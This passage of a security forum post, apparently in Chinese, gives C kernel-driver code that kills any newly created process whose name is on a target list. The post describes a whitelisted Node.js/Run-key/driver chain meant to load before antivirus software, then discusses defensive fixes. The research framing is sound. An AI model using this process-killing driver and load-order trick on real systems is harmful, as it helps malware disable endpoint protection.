
```c
VOID

CreateProcessRoutine(

	IN HANDLE  ParentId,

	IN HANDLE  ProcessId,

	IN BOOLEAN  Create

)

{

	UNREFERENCED_PARAMETER(ParentId);

	NTSTATUS status;

	HANDLE procHandle = NULL;

	CLIENT_ID ClientId;

	OBJECT_ATTRIBUTES Obja;

	Obja.Length = sizeof(Obja);

	Obja.RootDirectory = 0;

	Obja.ObjectName = 0;

	Obja.Attributes = 0;

	Obja.SecurityDescriptor = 0;

	Obja.SecurityQualityOfService = 0;



	ClientId.UniqueProcess = (HANDLE)ProcessId;

	ClientId.UniqueThread = 0;

	

	if (Create)   

	{

		PEPROCESS peprocess;

		status = PsLookupProcessByProcessId((HANDLE)ProcessId, &peprocess);

		if (!NT_SUCCESS(status))

		{

			return;

		}

		ObDereferenceObject(peprocess);

		UCHAR* Uname  = PsGetProcessImageFileName(peprocess); 

		if (strlen((char*)Uname)==0)

		{

			return;

		}

		char *targetar[9] = { "testok.exe" };

		

		

		char* tmp = mestrlwr((char*)Uname);

		DbgPrint("ss %s %s\n", tmp, Uname);

		int i = 0;

		while (i<9)

		{

			char* pSub = strstr((char*)tmp, targetar[i]);

			DbgPrint("finding %s\n", targetar[i]);

			if (NULL != pSub)

			{

				DbgPrint("found %s\n", Uname);

				DbgPrint("open %s\n", Uname);

				

				status = ZwOpenProcess(&procHandle, PROCESS_ALL_ACCESS, &Obja, &ClientId);//标准做法

				

				if (NT_SUCCESS(status) && procHandle != NULL) {//防止被hook 返回假值

					status = ZwTerminateProcess(procHandle, 1);

					DbgPrint("killing %s\n", Uname);

					if (NT_SUCCESS(status)) {

						DbgPrint("killed %s ok \n", Uname);

						

					}

					else {

						DbgPrint("killed %s failed\n ", Uname);

						

						 

					}

				}

				else

				{

				

					DbgPrint("kill failed %p \n", Uname);

				}

				break;

				

			}

			i++;

		}

	}

	return;

}
```

## 整体调用链

`Xp`

`Tt.exe`--->`node.exe`--->`main.js`--->`run`键值

`Run`键值--->`bat`--->`r.sys`

`Win7-win10`

`Tt.exe`--->`node.exe`--->`main.js`--->`run`键值

`Run`键值--->`r.exe`/`r64.exe`--->`bat`--->`r.sys`/`r64.sys`

关于驱动启动时机只要想办法比主防`exe`加载的稍快就可以。

![](https://bbs.kanxue.com/upload/attach/201902/846173_29QF3TQJP2PKCMU.jpg)

## 总结

1. 这种方式虽然外带了2个`pe`文件，但是由于重启导致调用链被断开，所以一些主防来不及处理。不少主防很注重重启时候的处理（`MoveFileEx` + `WM_QUERYENDSESSION`），但是对开机时机的处理还是有些欠缺。有的驱动开机甚至占了`boot`前几位，`service exe`也有了，但是 和用户交互的`exe`加载过慢，导致恶意程序加载时没有和用户交互及时反馈，默认放行。可能需要在服务和`userinit`/`explorer`的各种启动方式之间再做处理?这个只是猜想，
2. 如果把`pe`功能用`js`实现 ，甚至可以无需额外增加`pe`文件，至于`js`调用`dll`可以使用`ffi`。常规操作用`node`自带的库或三方库都可以实现。这种情况下如果官方`js`改动频繁，可能出现高危操作行为更新频繁的问题，该怎么处理？如果直接把`exe`去除白名单，或者对`Js`哈希采取白名单或者计数是否可以既少干扰用户，又能防止恶意操做？可能对`js`的改写行为加强监控是最合理的选择吧。
3. 这仅仅是`js`，脚本语言还有很多，面对多种脚本语言极有可能出现类似问题。这个可能需要软件官方和主防双方努力才能更安全吧。

⭐

⭐

⭐

测试视频和代码见附件⭐

⭐

⭐

编译环境 `vs2017` `wdk10` `1809`

`Exe`分为32 64两个版本

`Sys`分为 32 64两个版本

`Exe` 编译后放到`/libs/`目录 改名为`r.exe` `r64.exe`

`Sys` 编译后放到`/libs/`目录 改名为`r.sys` `r64.sys`

为防止恶意利用 大部分主防，驱动第二次加载才生效。

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

本文写的比较仓促，请各位大侠轻拍，不足之处请斧正包容，谢谢。

另外本人想在`sz` 找一份开发或者安全方面工作。

本人只做白的，黑色勿扰，多谢！！！

`ty`

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

⭐

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2019-2-22 05:22

被影光编辑

，原因： 附件上传过大重传

上传的附件：

- [`code.7z`](javascript:void(0);)
  （55.44kb，66次下载）
- [`tt.7z`](javascript:void(0);)
  （3.31MB，98次下载）
- [`shipin.7z`](javascript:void(0);)
  （6.68MB，85次下载）
